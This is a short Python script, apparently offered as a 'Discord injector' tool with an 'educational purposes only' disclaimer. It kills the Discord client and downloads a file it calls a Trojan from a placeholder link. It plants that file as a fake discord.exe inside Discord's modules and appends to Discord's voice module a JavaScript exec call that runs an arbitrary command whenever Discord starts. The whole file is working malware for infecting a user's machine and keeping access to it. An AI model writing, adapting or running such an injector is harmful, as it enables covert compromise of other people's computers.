import os
from colorama import  Fore,Back

PATH = os.getenv('APPDATA')+"\\Discord"

if __name__ == "__main__":
    os.system('cls')
    print(Fore.BLUE+" ____    _                                   _           ___             _                 _\n"   +
     "|  _ \  (_)  ___    ___    ___    _ __    __| |         |_ _|  _ __     (_)   ___    ___  | |_ \n"+
     "| | | | | | / __|  / __|  / _ \  | '__|  / _` |  _____   | |  | '_ \    | |  / _ \  / __| | __|\n"+
     "| |_| | | | \__ \ | (__  | (_) | | |    | (_| | |_____|  | |  | | | |   | | |  __/ | (__  | |_ \n"+
     "|____/  |_| |___/  \___|  \___/  |_|     \__,_|         |___| |_| |_|  _/ |  \___|  \___|  \__|\n"+
     "                                                                      |__/                     \n# Made by: Florian ( Made for educational purposes only :D )")
    try:
        import requests
        print(Fore.CYAN+"> All modules satisfied")
    except ModuleNotFoundError:
        os.system('pip install requests')
        import requests
    print(Fore.GREEN)
    os.system("taskkill /F /im discord.exe")
    for x in os.listdir(PATH):
        if x.count('.')>=2:
            PATH+="\\"+x
            break
    print(Fore.WHITE+"> Downloading Trojan..")
    r = requests.get('<link>')
    print(Fore.CYAN+"> Trojan downloaded")
    print(Fore.WHITE+"> Injecting Trojan...")
    if not os.path.isfile(PATH+"\\modules\\discord_utils\\discord.exe"):
        open(PATH + "\\modules\\discord_utils\\discord.exe",'w+').close()
        open(PATH + "\\modules\\discord_utils\\discord.exe", 'wb').write(r.content)
        with open(PATH+"\\modules\\discord_voice\\index.js", "a+") as f:
            inj = "const { exec } = require(\'child_process\');const cmd = \"###YOUR COMMAND HERE###\"; exec(cmd, (err, stdout, stderr) => {}); //hihi"
            f.write(inj)
            print(Fore.CYAN + "> Trojan Injected")
            f.close()
    else:
        print(Fore.RED+"ERR> Trojan already injected!")
    print(Fore.RESET)
